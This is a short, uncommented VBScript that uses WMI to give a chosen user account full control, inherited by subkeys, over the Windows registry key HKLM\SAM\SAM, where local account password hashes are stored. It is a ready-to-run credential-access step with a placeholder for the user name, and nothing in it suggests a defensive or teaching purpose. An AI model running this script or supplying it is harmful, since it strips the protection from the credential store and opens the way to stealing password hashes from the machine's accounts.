strUser = "REPLACE_WITH_USER"
Set objWMIService = GetObject("winmgmts:\\.\root\Cimv2")
Set colUsers = objWMIService.ExecQuery("SELECT * FROM Win32_Account WHERE Name='"&strUser&"'")
If colUsers.count<>0 Then
    For Each objUser In colUsers
            strSID = objUser.SID
    Next
Else
End If

Set objSID = objWMIService.Get("Win32_SID.SID='"&strSID&"'")

Set objTrustee = objWMIService.Get("Win32_Trustee").SpawnInstance_()
objTrustee.Domain = objSID.ReferencedDomainName
objTrustee.Name = objSID.AccountName
objTrustee.SID = objSID.BinaryRepresentation
objTrustee.SidLength = objSID.SidLength
objTrustee.SIDString = objSID.Sid

Set objNewACE = objWMIService.Get("Win32_ACE").SpawnInstance_()
objNewACE.AccessMask = 983103
objNewACE.AceType = 0
objNewACE.AceFlags = 2
objNewACE.Trustee = objTrustee

Const HKLM = &H80000002
strKeyPath = "SAM\SAM"
Set oReg = GetObject("Winmgmts:\root\default:StdRegProv")
RetVal = oReg.GetSecurityDescriptor(HKLM,strKeyPath,wmiSecurityDescriptor)
DACL = wmiSecurityDescriptor.DACL
ReDim objNewDacl(0)
Set objNewDacl(0) = objNewACE
For each objACE in DACL
    Ubd = UBound(objNewDacl)
    ReDim preserve objNewDacl(Ubd+1)
    Set objNewDacl(Ubd+1) = objACE
Next
wmiSecurityDescriptor.DACL = objNewDacl
RetVal = oReg.SetSecurityDescriptor(HKLM,strKeyPath,wmiSecurityDescriptor)
wscript.echo RetVal